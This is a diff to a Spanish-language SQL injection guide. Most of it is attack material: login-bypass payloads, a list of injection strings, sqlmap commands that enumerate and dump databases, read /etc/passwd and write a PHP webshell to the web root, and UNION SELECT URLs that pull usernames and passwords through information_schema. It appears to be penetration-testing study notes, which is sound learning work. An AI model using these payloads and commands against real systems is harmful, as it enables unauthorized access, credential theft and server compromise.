@@ -1,3 +1,21 @@
+# 📚 Guía Básica de Inyección SQL (SQLi) Manual y Automatizada
+
+---
+
+## 📑 Índice
+
+1. ¿Qué es una SQL Injection?
+2. ¿Por qué ocurre?
+3. Ejemplo sencillo
+4. Cómo detectar la vulnerabilidad
+5. Inyecciones comunes (manuales)
+6. Automatizar el ataque con sqlmap
+7. Ataques avanzados con sqlmap
+8. Guía de ataque manual (UNION SELECT)
+9. Resumen de ataque manual
+
+---
+
 ## ❓ ¿Qué es una SQL Injection?
 
 Una **SQL Injection** es un tipo de ataque que ocurre cuando un atacante es capaz de "inyectar" código SQL malicioso en una consulta que se envía a la base de datos.
@@ -9,9 +27,13 @@ Una **SQL Injection** es un tipo de ataque que ocurre cuando un atacante es capa
 - saltarse controles de autenticación,
 - ejecutar comandos administrativos en la base de datos.
 
+---
+
 ## 📌 ¿Por qué ocurre?
 
 Sucede cuando una aplicación web **no valida correctamente la entrada del usuario** antes de usarla en una consulta SQL.
+
+---
 
 ## 🔍 Ejemplo sencillo
 
@@ -38,7 +60,9 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 
 Como `'1'='1'` siempre es verdadero, es posible que el atacante logre iniciar sesión **sin conocer la contraseña**.
 
-## 🔍 ¿Cómo detectamos si existe esta vulnerabilidad?
+---
+
+## 🔍 ¿Cómo detectar la vulnerabilidad?
 
 Cuando vemos campos a rellenar, intentaremos inyectar código y observaremos la respuesta.  
 Lo primero es intentar **escapar del contexto actual** con entradas como:
@@ -57,9 +81,11 @@ Lo primero es intentar **escapar del contexto actual** con entradas como:
 ```
 
 Luego corregimos la consulta.  
-Podemos automatizar esta tarea con diccionarios como [SecLists](https://github.com/danielmiessler/SecLists), que incluyen muchos payloads.
+Podemos automatizar esta tarea con diccionarios como SecLists.
 
-### Inyecciones comunes (manuales)
+---
+
+## Inyecciones comunes (manuales)
 
 ```sql
 " or 1=1
@@ -116,13 +142,13 @@ or 1=1--
 or 1=1/*
 ```
 
+---
+
 ## 🤖 Automatizar el ataque
 
 Podemos automatizar el ataque con herramientas como `sqlmap`.
 
 ### 1️⃣ Buscar bases de datos
-
-Usamos la herramienta sobre la URL para buscar las bases de datos:
 
 ```bash
 sqlmap -u http://<IP> --forms --dbs --batch
@@ -130,23 +156,17 @@ sqlmap -u http://<IP> --forms --dbs --batch
 
 ### 2️⃣ Enumerar las tablas
 
-Si detecta bases de datos, inspeccionamos las tablas de una base de datos específica:
-
 ```bash
 sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> --tables --batch
 ```
 
 ### 3️⃣ Enumerar las columnas
 
-Una vez tengamos las tablas, inspeccionamos las columnas que las componen:
-
 ```bash
 sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> --columns --batch
 ```
 
 ### 4️⃣ Extraer los datos
-
-Cuando sepamos las columnas, le indicamos que nos muestre la información de las filas y columnas seleccionadas:
 
 ```bash
 sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> -C <NOMBRE_DE_LA_COLUMNA_1>,<NOMBRE_DE_LA_COLUMNA_2> --dump --batch
@@ -156,11 +176,7 @@ sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> 
 
 ## 🎯 Ataques avanzados con SQLMap
 
-Una vez que tenemos el ataque básico automatizado, podemos realizar técnicas más avanzadas:
-
 ### 🔹 Especificar el parámetro vulnerable
-
-Si sabemos qué parámetro es vulnerable (por ejemplo `id`):
 
 ```bash
 sqlmap -u "http://<IP>/pagina.php?id=1" -p id --dbs --batch
@@ -168,44 +184,35 @@ sqlmap -u "http://<IP>/pagina.php?id=1" -p id --dbs --batch
 
 ### 🔹 Aumentar el nivel y riesgo del ataque
 
-SQLMap permite personalizar la agresividad del ataque:
-
 ```bash
 sqlmap -u http://<IP> --forms --dbs --risk=3 --level=5 --batch
 ```
 
-- `--risk=3`: permite payloads más agresivos (por defecto es `1`).
-- `--level=5`: explora más tipos de inyecciones (por defecto es `1`).
-
-### 🔹 Usar cookies (si la aplicación requiere autenticación)
-
-Si la aplicación requiere sesión iniciada, podemos añadir la cookie:
+### 🔹 Usar cookies
 
 ```bash
 sqlmap -u http://<IP> --cookie="PHPSESSID=XXXXXXXXXXXXX" --dbs --batch
 ```
 
-### 🔹 Obtener el usuario actual de la base de datos
+### 🔹 Obtener el usuario actual
 
 ```bash
 sqlmap -u http://<IP> --current-user --batch
 ```
 
-### 🔹 Obtener la versión del motor de base de datos
+### 🔹 Obtener versión del motor
 
 ```bash
 sqlmap -u http://<IP> --banner --batch
 ```
 
-### 🔹 Leer archivos del sistema (si es posible)
-
-Si la inyección es lo suficientemente potente, podemos intentar leer archivos:
+### 🔹 Leer archivos
 
 ```bash
 sqlmap -u http://<IP> --file-read="/etc/passwd" --batch
 ```
 
-### 🔹 Escribir archivos en el servidor (WebShell)
+### 🔹 Escribir archivos (WebShell)
 
 ```bash
 sqlmap -u http://<IP> --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
@@ -213,161 +220,99 @@ sqlmap -u http://<IP> --file-write="shell.php" --file-dest="/var/www/html/shell.
 
 ---
 
-
-# Guía Básica de Inyección SQL Manual (con UNION SELECT y técnicas comunes)
-
----
-
-## ¿Qué es la inyección SQL manual?
-
-Es cuando el atacante introduce código SQL malicioso directamente en los campos de entrada o en la URL, para manipular las consultas y obtener información no autorizada, sin usar herramientas automáticas.
+## 🛠️ Guía de ataque manual (UNION SELECT)
 
 ---
 
-## Paso 1: Detectar la vulnerabilidad
+## Paso 1️⃣ Detectar la vulnerabilidad
 
-Inserta una comilla simple `'` en un parámetro de entrada (formulario, URL, etc.) y observa si la aplicación devuelve un error SQL o un comportamiento anómalo.
+Inserta una comilla simple `'` en un parámetro de entrada (formulario, URL, etc.).
 
-Ejemplo URL vulnerable:
+Ejemplo:
 
+```
 http://ejemplo.com/product.php?id=1'
+```
 
-Si devuelve error, es posible que sea vulnerable.
+O prueba con número negativo:
 
-
-Otra forma común es poner el número en negativo
-
+```
 http://ejemplo.com/product.php?id=-1
+```
 
 ---
 
-## Paso 2: Identificar el número de columnas con ORDER BY
+## Paso 2️⃣ Identificar el número de columnas con ORDER BY
 
-Prueba consultas como:
-
-http://ejemplo.com/product.php?id=1 ORDER BY 1--
-
-http://ejemplo.com/product.php?id=1 ORDER BY 2--
-
-http://ejemplo.com/product.php?id=1 ORDER BY 3--
+```bash
+http://ejemplo.com/product.php?id=1 ORDER BY 1-- -
+http://ejemplo.com/product.php?id=1 ORDER BY 2-- -
+http://ejemplo.com/product.php?id=1 ORDER BY 3-- -
 ...
+```
 
 Cuando aparezca un error, el número anterior indica la cantidad correcta de columnas.
 
 ---
 
-## Paso 3: Usar UNION SELECT para obtener datos
+## Paso 3️⃣ Usar UNION SELECT para obtener datos
 
-El UNION SELECT permite combinar resultados de otra consulta para mostrar datos arbitrarios.
+Ejemplo con 3 columnas:
 
-Ejemplo para 3 columnas:
-
-http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3--
-
-Si ves 1, 2 y 3 en la página, la inyección funciona.
-
----
-
-## Paso 4: Extraer datos reales
-
-Sustituye los números por columnas reales de una tabla, por ejemplo:
-
-http://ejemplo.com/product.php?id=1 UNION SELECT username, password, 3 FROM users--
-
-Esto mostrará los usuarios y contraseñas (o hashes) almacenados.
-
----
-
-## Paso 5: Evitar errores y comentarios
-
-- Usa -- o # para comentar el resto de la consulta original y evitar errores de sintaxis.
-- Ajusta la inyección para no romper la consulta original.
-
----
-
-
-## Otros trucos útiles
-
-- Usa funciones como CONCAT() para unir columnas:
-
-http://ejemplo.com/product.php?id=1 UNION SELECT CONCAT(username, 0x3a, password), null, null FROM users--
-
-(0x3a es el carácter : en hexadecimal)
-
-- Prueba inyecciones simples para verificar autenticación:
-
-' OR '1'='1
-
-- Comenta el resto para evitar errores:
-
-' OR '1'='1' --
-
----
-
-# 📌 Resumen de Ataque Manual SQLi
-
----
-
-## 1️⃣ Averiguar el número de columnas
-
-Probar con:
 ```bash
-http://ejemplo.com/product.php?id=1 ORDER BY 100-- -
+http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3-- -
 ```
-Si aparece un error como:
-```
-ORDER BY clause error
-```
-Vamos disminuyendo el número hasta que el error desaparezca.  
-El último número que no genera error indica el número de columnas.
+
+Si ves 1, 2, 3 en la página, la inyección funciona.
 
 ---
 
-## 2️⃣ Probar UNION SELECT con el número de columnas encontrado
+## Paso 4️⃣ Extraer datos reales
 
-Ejemplo si hay 5 columnas:
-```bash
-http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3,4,5-- -
-```
-Si aparece algún número en la página, se puede reemplazar por funciones o datos.
+Ejemplo:
 
-Ejemplo para obtener el nombre de la base de datos actual:
 ```bash
-http://ejemplo.com/product.php?id=1 UNION SELECT 1,DATABASE(),3,4,5-- -
+http://ejemplo.com/product.php?id=1 UNION SELECT username,password,3 FROM users-- -
 ```
+
 ---
 
-## 3️⃣ Listar bases de datos
+## Paso 5️⃣ Listar bases de datos
+
 ```bash
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
 ```
-Si no muestra todas las bases de datos o da error, podemos paginar con LIMIT:
+
+Con LIMIT:
+
 ```bash
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 0,1-- -
-http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 1,1-- -
-http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 2,1-- -
-...
 ```
+
 ---
 
-## 4️⃣ Listar nombres de las tablas de una base de datos
+## Paso 6️⃣ Listar nombres de tablas
+
 ```bash
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -
 ```
+
 ---
 
-## 5️⃣ Listar nombres de las columnas de una tabla
+## Paso 7️⃣ Listar columnas
+
 ```bash
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- -
 ```
+
 ---
 
-## 6️⃣ Mostrar datos concatenados
+## Paso 8️⃣ Mostrar datos concatenados
 
-Esto permite mostrar múltiples columnas en un solo campo visualizado:
-```
+```bash
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3,4,5 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- -
 ```
+
 (0x3a representa el carácter ":")
 
 ---
